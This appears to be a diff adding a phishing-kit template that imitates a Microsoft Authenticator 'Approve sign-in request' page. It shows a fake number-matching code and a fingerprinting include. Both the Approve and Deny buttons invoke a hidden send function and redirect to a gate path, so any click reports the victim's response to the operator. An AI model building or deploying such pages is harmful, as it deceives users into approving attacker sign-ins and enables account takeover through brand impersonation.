@@ -1,0 +1,63 @@
+<!-- BPP-Template
+name: MFA Verification
+description: Multi-factor authentication push approval page
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>{{ brand | default('Microsoft') }} - Verify your identity</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f2f2f2;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff; border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1);
+      padding: 40px 32px; text-align: center;
+      max-width: 380px; width: 92%;
+    }
+    .icon { font-size: 48px; margin-bottom: 16px }
+    h1 { font-size: 20px; margin-bottom: 8px }
+    p { font-size: 14px; color: #605e5c; margin-bottom: 24px; line-height: 1.5 }
+    .code {
+      font-size: 36px; font-weight: 700; letter-spacing: 8px;
+      color: #0078d4; margin-bottom: 24px;
+      font-family: 'Consolas', 'Courier New', monospace;
+    }
+    .btn {
+      display: block; width: 100%; padding: 12px;
+      background: #0078d4; color: #fff; border: none;
+      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
+    }
+    .btn:hover { background: #106ebe }
+    .deny { margin-top: 12px; background: none; border: 1px solid #ddd; color: #555 }
+    .deny:hover { background: #f5f5f5 }
+    .foot { margin-top: 24px; font-size: 11px; color: #999 }
+    .pulse { animation: pulse 2s ease-in-out infinite }
+    @keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:.5 } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">&#x1f510;</div>
+    <h1>Approve sign-in request</h1>
+    <p>A sign-in request has been sent to your account.<br>
+    If this was you, approve the request below.</p>
+    <div class="code pulse" id="codeDisplay">--</div>
+    <button class="btn" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">Approve</button>
+    <button class="btn deny" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">Deny</button>
+    <div class="foot">{{ brand | default('Microsoft') }} Authenticator</div>
+  </div>
+  {% include '_fingerprint.html' %}
+  <script>
+    var n = Math.floor(Math.random() * 90 + 10);
+    document.getElementById("codeDisplay").textContent = n;
+  </script>
+</body>
+</html>
